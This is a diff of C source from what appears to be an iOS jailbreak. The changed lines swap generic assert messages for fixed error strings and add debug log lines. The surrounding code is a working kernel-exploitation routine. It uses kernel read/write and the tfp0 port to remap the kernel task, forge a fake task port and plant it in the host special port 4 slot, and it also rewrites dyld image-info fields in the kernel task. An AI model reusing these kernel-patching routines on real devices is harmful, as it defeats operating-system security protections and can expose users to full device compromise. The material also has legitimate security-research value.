@@ -170,13 +170,13 @@ uint64_t make_fake_task(uint64_t vm_map) {
 void set_all_image_info_addr(uint64_t kernel_task_kaddr, uint64_t all_image_info_addr) {
     struct task_dyld_info dyld_info = { 0 };
     mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
-    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
+    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, "ERROR SET_ALL_IMAGE", true);
     LOGME("Will set all_image_info_addr to: " ADDR, all_image_info_addr);
     if (dyld_info.all_image_info_addr != all_image_info_addr) {
         LOGME("Setting all_image_info_addr...");
         WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_ADDR), all_image_info_addr);
-        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
-        _assert(dyld_info.all_image_info_addr == all_image_info_addr, message, true);
+        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, "ERROR SET_ALL_IMAGE", true);
+        _assert(dyld_info.all_image_info_addr == all_image_info_addr, "ERROR SET_ALL_IMAGE", true);
     } else {
         LOGME("All_image_info_addr already set.");
     }
@@ -185,13 +185,13 @@ void set_all_image_info_addr(uint64_t kernel_task_kaddr, uint64_t all_image_info
 void set_all_image_info_size(uint64_t kernel_task_kaddr, uint64_t all_image_info_size) {
     struct task_dyld_info dyld_info = { 0 };
     mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
-    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
+    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, "ERROR SET_ALL_IMAGE_INFO", true);
     LOGME("Will set all_image_info_size to: " ADDR, all_image_info_size);
     if (dyld_info.all_image_info_size != all_image_info_size) {
         LOGME("Setting all_image_info_size...");
         WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_SIZE), all_image_info_size);
-        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
-        _assert(dyld_info.all_image_info_size == all_image_info_size, message, true);
+        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, "ERROR SET_ALL_IMAGE_INFO", true);
+        _assert(dyld_info.all_image_info_size == all_image_info_size, "ERROR SET_ALL_IMAGE_INFO", true);
     } else {
         LOGME("All_image_info_size already set.");
     }
@@ -231,24 +231,27 @@ void remap_tfp0_set_hsp4(mach_port_t *port) {
     // kernel structures like tasks (or vtables :P )
     
     // and we can write our port to realhost.special[4]
-    
+    LOGME("STARTED REMAP");
     host_t host = mach_host_self();
-    _assert(MACH_PORT_VALID(host), message, true);
+    _assert(MACH_PORT_VALID(host), "INVALID HOST", true);
     uint64_t remapped_task_addr = 0;
     // task is smaller than this but it works so meh
     uint64_t sizeof_task = 0x1000;
+    LOGME("STILL HERE");
     uint64_t kernel_task_kaddr = ReadKernel64(GETOFFSET(kernel_task));
-    _assert(kernel_task_kaddr != 0, message, true);
+    _assert(kernel_task_kaddr != 0, "INVALID KADDR", true);
     LOGME("kernel_task_kaddr = " ADDR, kernel_task_kaddr);
+    LOGME("VARS");
     mach_port_t zm_fake_task_port = MACH_PORT_NULL;
     mach_port_t km_fake_task_port = MACH_PORT_NULL;
     kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
     kr = kr || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
     if (kr == KERN_SUCCESS && *port == MACH_PORT_NULL) {
-        _assert(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port) == KERN_SUCCESS, message, true);
+        _assert(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port) == KERN_SUCCESS, "INVALID MACH_TASK_SELF", true);
     }
     // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
     // or traditional \"zone_init: kmem_suballoc failed\"
+    LOGME("ZONE_MAP");
     uint64_t zone_map_kptr = GETOFFSET(zone_map_ref);
     uint64_t zone_map = ReadKernel64(zone_map_kptr);
     // kernel_task->vm_map == kernel_map
@@ -260,15 +263,18 @@ void remap_tfp0_set_hsp4(mach_port_t *port) {
     km_fake_task_port = zm_fake_task_port;
     vm_prot_t cur = 0;
     vm_prot_t max = 0;
-    _assert(mach_vm_remap(km_fake_task_port, &remapped_task_addr, sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, zm_fake_task_port, kernel_task_kaddr, 0, &cur, &max, VM_INHERIT_NONE) == KERN_SUCCESS, message, true);
-    _assert(kernel_task_kaddr != remapped_task_addr, message, true);
+    LOGME("REMAPPPPP");
+    _assert(mach_vm_remap(km_fake_task_port, &remapped_task_addr, sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, zm_fake_task_port, kernel_task_kaddr, 0, &cur, &max, VM_INHERIT_NONE) == KERN_SUCCESS, "INVALID REMAP", true);
+    _assert(kernel_task_kaddr != remapped_task_addr, "INVALID KADDR_2", true);
     LOGME("remapped_task_addr = " ADDR, remapped_task_addr);
-    _assert(mach_vm_wire(host, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE) == KERN_SUCCESS, message, true);
+    _assert(mach_vm_wire(host, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE) == KERN_SUCCESS, "INVALID WIRE", true);
     uint64_t port_kaddr = get_address_of_port(getpid(), *port);
     LOGME("port_kaddr = " ADDR, port_kaddr);
+    LOGME("FAK TASK PORTTT");
     make_port_fake_task_port(*port, remapped_task_addr);
-    _assert(ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) == remapped_task_addr, message, true);
+    _assert(ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) == remapped_task_addr, "INVALID RK64", true);
     // lck_mtx -- arm: 8  arm64: 16
+    LOGME("OK WTF");
     uint64_t host_priv_kaddr = get_address_of_port(getpid(), host);
     uint64_t realhost_kaddr = ReadKernel64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
     WriteKernel64(realhost_kaddr + koffset(KSTRUCT_OFFSET_HOST_SPECIAL) + 4 * sizeof(void *), port_kaddr);
